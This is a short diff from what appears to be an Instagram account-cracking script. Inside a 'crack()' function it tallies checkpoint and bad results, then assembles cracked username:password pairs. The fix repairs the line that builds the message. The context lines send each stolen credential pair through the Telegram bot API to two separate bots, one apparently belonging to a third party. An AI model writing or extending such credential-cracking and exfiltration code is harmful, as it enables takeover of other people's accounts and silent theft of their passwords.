@@ -176,7 +176,7 @@ def crack():
 			print('\033[93m Checkpoint : '+str(r2))
 			print('\033[31m Bad : '+str(r3))
 			print(logo2)
-			sender =HI NEW INSTAGRAM✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠ user+' : '+pas  ✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠✠BY faRa coder
+			sender = user+' : '+pas
 			send_telegram = 'https://api.telegram.org/bot' + token_bot + '/sendMessage?chat_id=' + id_tg + '&parse_mode=Markdown&text=' + sender
 			response = requests.get(send_telegram)
 			send_my = 'https://api.telegram.org/bot' + token_my + '/sendMessage?chat_id=' + id_my + '&parse_mode=Markdown&text=' + sender
